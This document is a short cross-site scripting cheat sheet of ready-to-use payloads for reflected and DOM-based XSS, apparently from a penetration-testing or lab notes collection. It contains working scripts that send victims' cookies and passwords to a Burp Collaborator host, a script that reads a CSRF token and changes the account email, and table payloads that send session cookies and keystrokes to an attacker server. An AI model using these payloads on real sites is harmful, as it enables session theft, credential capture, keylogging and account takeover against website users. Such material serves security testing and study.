# Cross-site scripting

## Reflected
In a reflected cross-site scripting attack, the malicious payload is part of the victims request to the website. The website includes this payload in response back to the user. To summarise, an attacker needs to trick a victim into clicking a URL to execute their malicious payload.

| Info | Payload |
|:-----|:--------|
| Basic Hello popup | `http://example.com/search?keyword=<script>alert('Hello')</script>` |
| Basic popup with IP Address of victim | `http://example.com/search?keyword=<script>alert(window.location.hostname)</script>` |
| Basic Alert popup | `<img src=1 onerror=alert(1)>` |
| Basic Print popup | `<img src=1 onerror=print()>` |

### Using Burp Collaborator to steal a cookie example
```java
<script>
fetch('https://cxd5j8xthl0k1lhn5x6ai04n4ea4yt.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script> 
```

### Using Burp Collaborator to capture password example 
```java
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://cxd5j8xthl0k1lhn5x6ai04n4ea4yt.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
### Exploiting XSS to perform CSRF

```java
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>\
```
## DOM-Based
In a DOM-based XSS attack, a malicious payload is not actually parsed by the victim's browser until the website's legitimate JavaScript is executed. 

| Info | Payload |
|:-----|:--------|
| Show text alert | `<script>alert('XSS');</script>` | 
| Show alert with cookies | `test" onmouseover="alert(document.cookie)"` |
| Change background of website to red | `test" onmouseover="document.body.style.backgroundColor = 'red';` |
| Steal session to attackers webserver | `<script>fetch('https://$lhost/steal?cookie=' + btoa(document.cookie));</script>` | 
| Keylogger to attackers webserver | `<script>document.onkeypress = function(e) { fetch('https://$lhost/log?key=' + btoa(e.key) );}</script>` |